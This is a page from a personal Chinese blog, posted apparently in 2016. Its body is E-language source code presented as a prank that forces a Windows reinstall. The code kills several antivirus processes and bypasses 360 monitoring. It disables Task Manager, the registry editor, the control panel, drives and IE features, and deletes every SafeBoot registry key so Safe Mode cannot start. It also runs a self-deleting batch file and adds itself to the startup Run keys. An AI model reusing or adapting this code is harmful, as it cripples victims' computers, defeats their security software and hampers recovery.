@@ -1,0 +1,188 @@
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=renderer content=webkit><meta name=force-rendering content=webkit><meta name=viewport content="width=device-width,minimum-scale=1,initial-scale=1"><meta http-equiv=cache-control content=no-transform><meta http-equiv=cache-control content=no-siteapp><meta name=generator content="Hugo 0.57.2"><meta name=author content=25H><meta name=copyright content=ARAE><meta name=robots content=all><meta name=keywords content=易语言,源码,系统><meta name=description content="易语言 写注册项恶搞到你重装系统 运行 (“taskkill /f /im kavsvc.exe”, 假, 1) 运行 (“taskkill /f /im KVXP.kxp”, 假, 1) 运行 (“taskkill /f /im Rav.exe”, 假, 1) 运行 (“taskkill /f …"><title>易语言 写注册项恶搞到你重装系统 - ARAE</title><link rel=icon href=/images/favicon.png><link rel=canonical href=https://arae.cc/post/25692.html><link rel=stylesheet href=/css/style.min.css><script src=/css/script.min.js></script></head><body><div id=kratos-wrapper><div id=kratos-page><div id=kratos-header><header id=kratos-header-section><div class=container><div class=nav-header><nav id=kratos-menu-wrap class=menu-main-container><ul id=kratos-primary-menu class=sf-menu><li class=current-menu-item><a href=/ aria-current=page><i class="fa fa-home"></i>&nbsp;首页</a></li><li><a href=/categories/%E7%8A%B6%E6%80%81.html><i class="fa fa-at"></i>&nbsp;状态</a></li><li><a href=javascript:;><i class="fa fa-folder-o"></i>&nbsp;分类</a><ul class=sub-menu><li><a href=/categories/code.html>Coding</a></li><li><a href=/categories/%E4%BD%9C%E5%93%81.html>作品</a></li><li><a href=/categories/%E7%AC%94%E8%AE%B0.html>笔记</a></li><li><a href=/categories/%E8%BD%AC%E8%BD%BD.html>转载</a></li><li><a href=/categories/%E6%9C%AA%E5%88%86%E7%B1%BB.html>未分类</a></li></ul></li><li><a href=/z/projects.html><i class="fa fa-bug"></i>&nbsp;项目</a></li><li><a href=/z/links.html><i class="fa fa-mars"></i>&nbsp;友链</a></li><li><a href=/z/about.html><i class="fa fa-rocket"></i>&nbsp;关于</a></li></ul></nav></div></div></header></div><div class="kratos-start kratos-hero-2"><div class=kratos-overlay></div><div class="kratos-cover kratos-cover_2 text-center"><div class="desc desc2 animate-box"><a href=https://arae.cc/><h2>25H's Blog</h2><br><span>一个安静的角落</span></a></div></div></div><div id=kratos-blog-post style=background:#f5f5f5><div id=container class=container style=opacity:1><div class=row><section id=main class=col-md-8><article><div class="kratos-hentry kratos-post-inner clearfix"><header class=kratos-entry-header><h1 class="kratos-entry-title text-center">易语言 写注册项恶搞到你重装系统</h1><div class="kratos-post-meta text-center"><span title="2016-07-11 16:05:09"><i class="fa fa-calendar"></i>&nbsp;2016年07月11日</span>
+<span><i class="fa fa-folder-o"></i>&nbsp;<a class=label href=/categories/code.html>Code</a></span><span title="文章字数： ≈ 13154 字"><i class="fa fa-file-word-o"></i>&nbsp;13.15k</span>
+<span title="阅读时长： ≈ 27 分钟"><i class="fa fa-clock-o"></i>&nbsp;27min</span>
+<span><i class="fa fa-user"></i>&nbsp;25H</span></div></header><div class=kratos-post-content><p>易语言 写注册项恶搞到你重装系统</p><pre><code>运行 (“taskkill /f /im kavsvc.exe”, 假, 1)
+运行 (“taskkill /f /im KVXP.kxp”, 假, 1)
+运行 (“taskkill /f /im Rav.exe”, 假, 1)
+运行 (“taskkill /f /im Ravmon.exe”, 假, 1)
+运行 (“taskkill /f /im Mcshield.exe”, 假, 1)
+运行 (“taskkill /f /im VsTskMgr.exe”, 假, 1)
+' 绕过360监控
+写注册项 (4, “SOFTWARE\360Safe\safemon\ExecAccess”, 0)
+写注册项 (4, “SOFTWARE\360Safe\safemon\MonAccess”, 0)
+写注册项 (4, “SOFTWARE\360Safe\safemon\SiteAccess”, 0)
+写注册项 (4, “SOFTWARE\360Safe\safemon\UDiskAccess”, 0)
+运行 (“taskkill /f /im 360tray.exe”, 假, 1)  ' 结束360进程
+' 修改关联
+写注册项 (1, “.txt\”, “jpegfile”)
+写注册项 (1, “.inf\”, “jpegfile”)
+写注册项 (4, “SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue”, 0)  ' 隐藏文件和文件夹
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr”, 0)  ' 禁用任务管理器
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel”, 1)  ' 禁用控制面板
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\System\Disableregistrytools”, 1)  ' 禁用注册表
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun”, 1)  ' 隐藏开始中的运行 禁止WIN2000/XP通过任务管理器创建新任务
+写注册项 (3, “SoftWare \Microsoft \Windows \CurrentVersion \Policies\WinOldApp\Disabled”, 1)
+' 隐藏“MS-DOS方式”下的磁盘驱动器。不管是在“我的电脑”里，或“MS－DOS”方式下都看不见了
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives”, 4294967295)  ' 隐藏所有驱动器
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewOnDrive”, 4294967295)  ' 禁止所有驱动器
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFolderOptions”, 1)  ' 隐藏文件夹选项
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop”, 1)  ' 将桌面对象隐藏
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose”, 1)  ' 隐藏开始中的关机
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind”, 1)  ' 隐藏开始中的搜索
+' 写注册项 (3, “Software\Policies\Microsoft\Windows\System\DisableCMD”, 1)'1 禁用CMD和.BAT文件 2 禁CMD不禁.BAT 0启用两项
+写注册项 (3, “Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage”, 1)  ' 隐藏主页选项组
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFileMenu”, 1)  ' 隐藏IE文件菜单
+写注册项 (3, “Software\Policies\Microsoft\Internet Explorer\Restrictions\NoFavorites”, 1)  ' 隐藏收藏夹菜单
+写注册项 (3, “Software\Policies\Microsoft\Internet Explorer\Restrictions\NoPrinting”, 1)  ' 禁用IE打印功能
+写注册项 (3, “Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserOptions”, 1)  ' 隐藏Internet选项
+写注册项 (3, “Software\Policies\Microsoft\Internet Explorer\Restrictions\NoViewSource”, 1)  ' 禁止IE查看源文件
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Interner Settings\Zones\3\1803”, 3)  ' 禁用IE下载功能
+写注册项 (3, “Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserContextMenu”, 1)  ' 禁止右键关联菜单
+
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRealMode”, 1)  ' 禁止“重新启动计算机切换到MS-DOS方式”
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogOff”, 1)  ' 禁止显示“注销”
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRecentDocsMenu”, 1)  ' 禁止文档菜单
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogOff”, 1)  ' 去掉“开始”选单中的“登录”项
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewContextMenu”, 1)  ' 禁止使用鼠标右键
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetFolders”, 1)  ' 禁止修改控制面版
+' 无法进入安全模式
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{36FC9E60-C465-11CF-8056-444553540000}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E965-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E967-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E969-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E96A-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E96B-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E96F-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E977-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E97B-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E97D-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E980-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{71A27CDD-812A-11D0-BEC7-08002BE2092F}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{745A17A0-74D3-11D0-B6FE-00A0C90F57DA}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\AppMgmt\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\Base\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\Boot Bus Extender\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\Boot file system\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\CryptSvc\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\DcomLaunch\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\dmadmin\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\dmboot.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\dmio.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\dmload.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\dmserver\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\EventLog\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\File system\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\Filter\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\HelpSvc\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\Netlogon\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\PCI Configuration\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\PlugPlay”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\PNP Filter\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\Primary disk\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\RpcSs\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\SCSI Class\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\sermouse.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\sr.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\SRService\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\System Bus Extender\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\vga.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\vgasave.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\WinMgmt\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{36FC9E60-C465-11CF-8056-444553540000}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E965-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E967-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E969-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E96A-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E96B-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E96F-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E972-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E973-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E974-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E975-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E977-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E97B-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E97D-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E980-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{71A27CDD-812A-11D0-BEC7-08002BE2092F}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{745A17A0-74D3-11D0-B6FE-00A0C90F57DA}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AFD\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AppMgmt\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Base\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Boot Bus Extender\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Boot file system\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Browser\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\CryptSvc\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\DcomLaunch\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Dhcp\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\dmadmin\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\dmboot.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\dmio.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\dmload.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\dmserver\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\DnsCache\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\EventLog\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\File system\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Filter\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\HelpSvc\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\ip6fw.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\ipnat.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\LanmanServer\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\LanmanWorkstation\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\LmHosts\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Messenger\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\NDIS\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\NDIS Wrapper\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Ndisuio\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\NetBIOS\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\NetBIOSGroup\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\NetBT\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\NetDDEGroup\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Netlogon\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\NetMan\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Network\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\NetworkProvider\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\NtLmSsp\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\PCI Configuration\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\PlugPlay\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\PNP Filter\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\PNP_TDI\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Primary disk\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\rdpcdd.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\rdpdd.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\rdpwd.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\rdsessmgr\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\RpcSs\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\SCSI Class\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\sermouse.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\SharedAccess\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\sr.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\SRService\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Streams Drivers\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\System Bus Extender\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Tcpip\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\TDI\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\tdpipe.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\tdtcp.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\termservice\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\vga.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\vgasave.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\WinMgmt\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\WZCSVC\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Ndisuio\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\”)
+写注册项 (4, “Software\Microsoft\Windows\CurrentVersion\Run\Explore.exe”, 读环境变量 (“SystemRoot”) ＋ “\system32” ＋ “\” ＋ 到文本 (取分钟 (取现行时间 ())) ＋ “.vbs”)  ' 把隐藏批处理脚本加入启动项
+' 修改EXE图标
+' 置文件属性 (读环境变量 (“SystemRoot”) ＋ “\system32\wscript.ico”, 7 ＋ 32)
+写到文件 (读环境变量 (“SystemRoot”) ＋ “\system32\reg.bat”, 到字节集 (“@echo off” ＋ #换行符 ＋ “regedit /s reg.reg” ＋ #换行符 ＋ “assoc .exe=exefile” ＋ #换行符 ＋ “del /f /s /q /a ” ＋ 读环境变量 (“SystemRoot”) ＋ “\system32\reg.reg” ＋ #换行符 ＋ “del /f /s /q /a ” ＋ 读环境变量 (“SystemRoot”) ＋ “\system32\reg.bat”))
+运行 (读环境变量 (“SystemRoot”) ＋ “\system32\reg.bat”, 假, 1)
+写注册项 (4, “SOFTWARE\360Safe\safemon\ExecAccess”, 1)
+写注册项 (4, “SOFTWARE\360Safe\safemon\MonAccess”, 1)
+写注册项 (4, “SOFTWARE\360Safe\safemon\SiteAccess”, 1)
+写注册项 (4, “SOFTWARE\360Safe\safemon\UDiskAccess”, 1)
+写注册项 (#本地机器, “SOFTWARE\Microsoft\Windows\CurrentVersion\Run\RTHDCPL”, 取运行目录 () ＋ “\” ＋ 取执行文件名 ())
+</code></pre></div><div class="kratos-copyright text-center clearfix"><h5>本作品采用 <a rel="license nofollow" target=_blank href=https://creativecommons.org/licenses/by-nc-sa/4.0/ title="CC BY-NC-SA 4.0">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a> 进行许可</h5></div><footer class="kratos-entry-footer clearfix"><div class="post-like-donate text-center clearfix"><a href=javascript:; class=Donate><i class="fa fa-bitcoin"></i>&nbsp;打赏</a></div><div class="footer-tag clearfix"><div class=pull-left><i class="fa fa-tags"></i>&nbsp;
+<a href=/tags/%E6%98%93%E8%AF%AD%E8%A8%80.html rel=tag>易语言</a>
+<a href=/tags/%E6%BA%90%E7%A0%81.html rel=tag>源码</a>
+<a href=/tags/%E7%B3%BB%E7%BB%9F.html rel=tag>系统</a></div><div class=pull-date><span title="2019年08月30日 21:21:00">最后编辑：2019年08月30日</span></div></div></footer></div><nav class="navigation post-navigation clearfix" role=navigation><div class="nav-previous clearfix"><a title="易语言 客户组件post发送数据带所有信息" href=/post/25693.html>&lt; 上一篇</a></div><div class=nav-next><a title=易语言windows命令合集 href=/post/25668.html>下一篇 &gt;</a></div></nav><div id=comments class=comments-area><div id=comments-body data-pid=/post/25692.html><p class=mClose>评论功能被我吃了。</p></div></div></article></section><aside id=kratos-widget-area class="col-md-4 hidden-xs hidden-sm scrollspy"><div id=sidebar class=affix-top><aside class="widget widget_kratos_about clearfix"><div class=photo-background></div><div class="photo-wrapper clearfix"><div class="photo-wrapper-tip text-center"><a href=javascript:;><img class=about-photo src=/images/avatar.png alt=25H></a></div></div><div class=textwidget><p class=text-center><span style=font-size:10pt>五米雌雄同体，十米人畜不分。</span></p></div></aside><aside class="widget widget_categories clearfix"><h4 class=widget-title>分类目录</h4><ul><li><a title=code href=/categories/code.html>code</a></li><li><a title=作品 href=/categories/%E4%BD%9C%E5%93%81.html>作品</a></li><li><a title=未分类 href=/categories/%E6%9C%AA%E5%88%86%E7%B1%BB.html>未分类</a></li><li><a title=状态 href=/categories/%E7%8A%B6%E6%80%81.html>状态</a></li><li><a title=笔记 href=/categories/%E7%AC%94%E8%AE%B0.html>笔记</a></li><li><a title=转载 href=/categories/%E8%BD%AC%E8%BD%BD.html>转载</a></li></ul></aside><aside id=kratos_ad-2 class="widget widget_kratos_ad clearfix"><a href=/z/about.html#打赏-赞助><img class="carousel-inner img-responsive img-rounded" src=/images/rw.jpg></a></aside></div></aside></div></div></div><footer><div id=footer style=background:#23282d><div class=container><div class=row><div class="col-md-6 col-md-offset-3 footer-list text-center"><p class=kratos-social-icons></p><p>© 2019 <a href=https://arae.cc/>ARAE</a>. All Rights Reserved.<br>Powered by <a href=https://gohugo.io/ target=_blank rel=nofollow>Hugo</a> Hosted by <a href=https://pages.github.com target=_blank rel=nofollow>Github Pages</a><br>Theme <a href=https://arae.cc/>Rolla</a> Made by <a href=https://moedog.org/ target=_blank rel=nofollow>Moedog</a> Modified by <a href=https://arae.cc/>25H</a></p></div></div></div><div class="cd-tool text-center"><div class="gotop-box active"><div class=gotop-btn><span class="fa fa-chevron-up"></span></div></div><div class=search-box><span class="fa fa-search"></span><form class=search-form id=searchform target=_blank role=search><input type=text name=wd id=search placeholder=Search... style=display:none></form></div></div></div></footer></div></div></body></html>
